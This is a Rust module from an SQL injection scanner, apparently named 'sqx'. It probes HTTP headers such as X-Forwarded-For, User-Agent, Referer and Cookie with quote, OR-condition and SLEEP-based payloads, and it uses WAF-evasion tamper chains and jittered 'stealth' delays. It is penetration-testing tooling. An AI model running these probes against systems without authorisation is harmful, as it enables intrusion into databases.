//! Header injection vectors: X-Forwarded-For, User-Agent, Referer, Cookie, X-Real-IP.
//!
//! Many back-ends log these headers directly into the DB (analytics, audit tables,
//! WAF bypass logs) without sanitization. Standard URL-param scanners miss them
//! entirely. This module tests each injectable header with error-based, boolean-blind,
//! and time-based techniques — the same three tiers used for URL params.

use std::time::{Duration, Instant};
use tracing::{debug, info, warn};

use crate::sqx::{
    detector::SqliDetector,
    evasion::tamper_chain::TamperChain,
    models::{HttpResponse, SqliTechnique, SqliTestResult},
    similarity::detect_sql_error,
};

/// Headers to probe, paired with a benign baseline value.
/// The baseline is injected in the *normal* request so the server accepts it;
/// payloads are appended to this value.
const INJECTABLE_HEADERS: &[(&str, &str)] = &[
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("User-Agent", "Mozilla/5.0 (compatible; sqx/1.0)"),
    ("Referer", "https://example.com/"),
    ("Cookie", "session=sqx_test"),
];

/// Quick error-based payloads — single-char openers plus common OR conditions.
const ERROR_PAYLOADS: &[&str] = &[
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' AND (SELECT SLEEP(5)) --",
    "' AND SLEEP(5) --",
    "\" AND SLEEP(5) --",
    "'; SELECT SLEEP(5) --",
];

impl SqliDetector {
    /// Test all injectable headers against `url`.
    ///
    /// Called automatically from `test_url` after URL-param testing.
    /// The `parameter` field in each result is prefixed with `header:` so
    /// reports clearly distinguish header vectors from query-string params.
    pub async fn test_headers(&self, url: &str) -> Vec<SqliTestResult> {
        self.test_headers_with_optional_tamper(url, None).await
    }

    pub async fn test_headers_with_tamper(
        &self,
        url: &str,
        tamper: &TamperChain,
    ) -> Vec<SqliTestResult> {
        self.test_headers_with_optional_tamper(url, Some(tamper))
            .await
    }

    async fn test_headers_with_optional_tamper(
        &self,
        url: &str,
        tamper: Option<&TamperChain>,
    ) -> Vec<SqliTestResult> {
        let mut results = Vec::new();

        for (header_name, baseline_value) in INJECTABLE_HEADERS {
            debug!("Testing header injection vector: {}", header_name);
            let found = self
                .test_header_injection(url, header_name, baseline_value, tamper)
                .await;
            results.extend(found);
            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
                self.config.delay_ms,
                self.config.stealth.jitter_pct,
            ))
            .await;
        }

        if !results.is_empty() {
            info!(
                "Header injection scan complete — {} finding(s) in {}",
                results.len(),
                url
            );
        }

        results
    }

    /// Test a single header for all three quick techniques.
    ///
    /// `header_value` is the benign value sent in the baseline request.
    /// Payloads are appended to it (e.g. `127.0.0.1'`).
    pub(crate) async fn test_header_injection(
        &self,
        url: &str,
        header_name: &str,
        header_value: &str,
        tamper: Option<&TamperChain>,
    ) -> Vec<SqliTestResult> {
        let mut results = Vec::new();

        // Baseline: send the request with the benign header value.
        let baseline = match self
            .send_request_with_injected_header(url, header_name, header_value)
            .await
        {
            Ok(r) => r,
            Err(e) => {
                warn!("Baseline request failed for header {}: {}", header_name, e);
                return results;
            }
        };

        let param_label = format!("header:{}", header_name);

        // Compute adaptive sleep for time-based detection based on baseline response time.
        let estimated_stddev =
            std::time::Duration::from_millis(baseline.duration.as_millis() as u64 / 4);
        let adaptive_sleep = self.compute_adaptive_sleep(baseline.duration, estimated_stddev);
        self.set_adaptive_sleep(adaptive_sleep);

        'payload: for &raw_payload in ERROR_PAYLOADS {
            let effective = match tamper {
                Some(chain) => chain.apply(raw_payload),
                None => raw_payload.to_string(),
            };
            let injected_value = format!("{}{}", header_value, effective);

            let start = Instant::now();
            let resp = match self
                .send_request_with_injected_header(url, header_name, &injected_value)
                .await
            {
                Ok(r) => r,
                Err(_) => continue 'payload,
            };
            let elapsed = start.elapsed();

            // ── Error-based ──────────────────────────────────────────────────
            if self.config.techniques.contains(&SqliTechnique::ErrorBased) {
                if let Some(dbms) = detect_sql_error(&resp.body) {
                    info!(
                        "Header injection (error-based) confirmed: {} — DBMS: {}",
                        header_name, dbms
                    );
                    results.push(SqliTestResult {
                        parameter: param_label.clone(),
                        technique: SqliTechnique::ErrorBased,
                        confidence: 0.93,
                        payload: effective.clone(),
                        evidence: format!("SQL error in {} response: {}", header_name, dbms),
                        dbms_hint: Some(dbms),
                        injection_context: None,
                        payload_id: None,
                    });
                    // One finding per header is enough to flag it.
                    return results;
                }
            }

            // ── Boolean-blind ────────────────────────────────────────────────
            if self
                .config
                .techniques
                .contains(&SqliTechnique::BooleanBlind)
            {
                let baseline_len = baseline.body.len() as i64;
                let resp_len = resp.body.len() as i64;
                if (baseline_len - resp_len).abs() > 50 && baseline.status == resp.status {
                    info!(
                        "Header injection (boolean-blind) indicator: {} length {} → {}",
                        header_name, baseline_len, resp_len
                    );
                    results.push(SqliTestResult {
                        parameter: param_label.clone(),
                        technique: SqliTechnique::BooleanBlind,
                        confidence: 0.60,
                        payload: effective.clone(),
                        evidence: format!(
                            "Response length changed for header {}: {} → {}",
                            header_name, baseline_len, resp_len
                        ),
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                    return results;
                }
            }

            // ── Time-based ───────────────────────────────────────────────────
            if self.config.techniques.contains(&SqliTechnique::TimeBased)
                && elapsed.as_secs() >= self.sleep_duration_secs()
            {
                info!(
                    "Header injection (time-based) confirmed: {} delayed {}ms",
                    header_name,
                    elapsed.as_millis()
                );
                results.push(SqliTestResult {
                    parameter: param_label.clone(),
                    technique: SqliTechnique::TimeBased,
                    confidence: 0.78,
                    payload: effective.clone(),
                    evidence: format!(
                        "Response delayed {}ms via header {}",
                        elapsed.as_millis(),
                        header_name
                    ),
                    injection_context: None,
                    dbms_hint: None,
                    payload_id: None,
                });
                return results;
            }

            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
                self.config.delay_ms,
                self.config.stealth.jitter_pct,
            ))
            .await;
        }

        results
    }

    /// Test all injectable headers against `url` using a POST request body.
    ///
    /// Less-18 style targets only log headers (User-Agent, X-Forwarded-For, …)
    /// when a POST with valid credentials is submitted. This mirrors
    /// `test_headers` but sends a POST body alongside every probe.
    pub async fn test_headers_post(
        &self,
        url: &str,
        post_body: &str,
        content_type: &str,
    ) -> Vec<SqliTestResult> {
        self.test_headers_post_with_optional_tamper(url, post_body, content_type, None)
            .await
    }

    pub async fn test_headers_post_with_tamper(
        &self,
        url: &str,
        post_body: &str,
        content_type: &str,
        tamper: &TamperChain,
    ) -> Vec<SqliTestResult> {
        self.test_headers_post_with_optional_tamper(url, post_body, content_type, Some(tamper))
            .await
    }

    async fn test_headers_post_with_optional_tamper(
        &self,
        url: &str,
        post_body: &str,
        content_type: &str,
        tamper: Option<&TamperChain>,
    ) -> Vec<SqliTestResult> {
        let mut results = Vec::new();

        for (header_name, baseline_value) in INJECTABLE_HEADERS {
            debug!("Testing POST header injection vector: {}", header_name);
            let found = self
                .test_header_injection_post(
                    url,
                    post_body,
                    content_type,
                    header_name,
                    baseline_value,
                    tamper,
                )
                .await;
            results.extend(found);
            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
                self.config.delay_ms,
                self.config.stealth.jitter_pct,
            ))
            .await;
        }

        if !results.is_empty() {
            info!(
                "POST header injection scan complete — {} finding(s) in {}",
                results.len(),
                url
            );
        }

        results
    }

    /// Test a single header for all techniques using POST requests.
    pub(crate) async fn test_header_injection_post(
        &self,
        url: &str,
        post_body: &str,
        content_type: &str,
        header_name: &str,
        header_value: &str,
        tamper: Option<&TamperChain>,
    ) -> Vec<SqliTestResult> {
        let mut results = Vec::new();

        let ct_header = match content_type {
            "json" => "application/json",
            "xml" => "application/xml",
            _ => "application/x-www-form-urlencoded",
        };

        let baseline = match self
            .send_post_request_with_injected_header(
                url,
                post_body,
                ct_header,
                header_name,
                header_value,
            )
            .await
        {
            Ok(r) => r,
            Err(e) => {
                warn!(
                    "POST baseline request failed for header {}: {}",
                    header_name, e
                );
                return results;
            }
        };

        let param_label = format!("header:{}", header_name);

        'payload: for &raw_payload in ERROR_PAYLOADS {
            let effective = match tamper {
                Some(chain) => chain.apply(raw_payload),
                None => raw_payload.to_string(),
            };
            let injected_value = format!("{}{}", header_value, effective);

            let start = Instant::now();
            let resp = match self
                .send_post_request_with_injected_header(
                    url,
                    post_body,
                    ct_header,
                    header_name,
                    &injected_value,
                )
                .await
            {
                Ok(r) => r,
                Err(_) => continue 'payload,
            };
            let elapsed = start.elapsed();

            if self.config.techniques.contains(&SqliTechnique::ErrorBased) {
                if let Some(dbms) = crate::sqx::similarity::detect_sql_error(&resp.body) {
                    info!(
                        "POST header injection (error-based) confirmed: {} — DBMS: {}",
                        header_name, dbms
                    );
                    results.push(SqliTestResult {
                        parameter: param_label.clone(),
                        technique: SqliTechnique::ErrorBased,
                        confidence: 0.93,
                        payload: effective.clone(),
                        evidence: format!("SQL error via POST header {}: {}", header_name, dbms),
                        dbms_hint: Some(dbms),
                        injection_context: None,
                        payload_id: None,
                    });
                    return results;
                }
            }

            if self
                .config
                .techniques
                .contains(&SqliTechnique::BooleanBlind)
            {
                let baseline_len = baseline.body.len() as i64;
                let resp_len = resp.body.len() as i64;
                if (baseline_len - resp_len).abs() > 50 && baseline.status == resp.status {
                    results.push(SqliTestResult {
                        parameter: param_label.clone(),
                        technique: SqliTechnique::BooleanBlind,
                        confidence: 0.60,
                        payload: effective.clone(),
                        evidence: format!(
                            "POST response length changed for header {}: {} → {}",
                            header_name, baseline_len, resp_len
                        ),
                        dbms_hint: None,
                        injection_context: None,
                        payload_id: None,
                    });
                    return results;
                }
            }

            if self.config.techniques.contains(&SqliTechnique::TimeBased)
                && elapsed.as_secs() >= self.sleep_duration_secs()
            {
                results.push(SqliTestResult {
                    parameter: param_label.clone(),
                    technique: SqliTechnique::TimeBased,
                    confidence: 0.78,
                    payload: effective.clone(),
                    evidence: format!(
                        "POST response delayed {}ms via header {}",
                        elapsed.as_millis(),
                        header_name
                    ),
                    injection_context: None,
                    dbms_hint: None,
                    payload_id: None,
                });
                return results;
            }

            tokio::time::sleep(crate::sqx::stealth::jittered_delay(
                self.config.delay_ms,
                self.config.stealth.jitter_pct,
            ))
            .await;
        }

        results
    }

    /// Send a POST request where `header_name` is set to `header_value`.
    pub(crate) async fn send_post_request_with_injected_header(
        &self,
        url: &str,
        post_body: &str,
        content_type_header: &str,
        header_name: &str,
        header_value: &str,
    ) -> anyhow::Result<HttpResponse> {
        if let Some(ref session) = self.session {
            session.maybe_refresh_csrf(&self.client).await;
        }

        let start = Instant::now();

        let ua = if header_name.eq_ignore_ascii_case("User-Agent") {
            header_value.to_string()
        } else {
            self.config.user_agent.clone()
        };

        let mut builder = self
            .client
            .post(url)
            .header("User-Agent", ua)
            .header("Content-Type", content_type_header)
            .body(post_body.to_string());

        if !header_name.eq_ignore_ascii_case("User-Agent") {
            builder = builder.header(header_name, header_value);
        }

        if let Some(ref session) = self.session {
            builder = session.apply(builder);
        }

        let response = builder.send().await?;

        if let Some(ref session) = self.session {
            session.update_from_response(&response);
        }

        let status = response.status().as_u16();
        let headers: std::collections::HashMap<String, String> = response
            .headers()
            .iter()
            .filter_map(|(k, v)| {
                v.to_str()
                    .ok()
                    .map(|vs| (k.as_str().to_lowercase(), vs.to_string()))
            })
            .collect();
        let body = response.text().await?;
        let duration = start.elapsed();

        Ok(HttpResponse {
            status,
            body,
            duration,
            headers,
        })
    }

    /// Send a GET request where `header_name` is set to `header_value`.
    ///
    /// All other request setup (session, CSRF, User-Agent default) follows the
    /// same path as `send_request`. When `header_name` is `"User-Agent"` the
    /// injected value replaces the default UA from config.
    pub(crate) async fn send_request_with_injected_header(
        &self,
        url: &str,
        header_name: &str,
        header_value: &str,
    ) -> anyhow::Result<HttpResponse> {
        if let Some(ref session) = self.session {
            session.maybe_refresh_csrf(&self.client).await;
        }

        let start = Instant::now();

        // Start with User-Agent from config; override below if that's the
        // header under test.
        let ua = if header_name.eq_ignore_ascii_case("User-Agent") {
            header_value.to_string()
        } else {
            self.config.user_agent.clone()
        };

        let mut builder = self.client.get(url).header("User-Agent", ua);

        // Inject the target header (skip User-Agent — already handled above).
        if !header_name.eq_ignore_ascii_case("User-Agent") {
            builder = builder.header(header_name, header_value);
        }

        if let Some(ref session) = self.session {
            builder = session.apply(builder);
        }

        let response = builder.send().await?;

        if let Some(ref session) = self.session {
            session.update_from_response(&response);
        }

        let status = response.status().as_u16();
        let headers: std::collections::HashMap<String, String> = response
            .headers()
            .iter()
            .filter_map(|(k, v)| {
                v.to_str()
                    .ok()
                    .map(|vs| (k.as_str().to_lowercase(), vs.to_string()))
            })
            .collect();
        let body = response.text().await?;
        let duration = start.elapsed();

        Ok(HttpResponse {
            status,
            body,
            duration,
            headers,
        })
    }
}
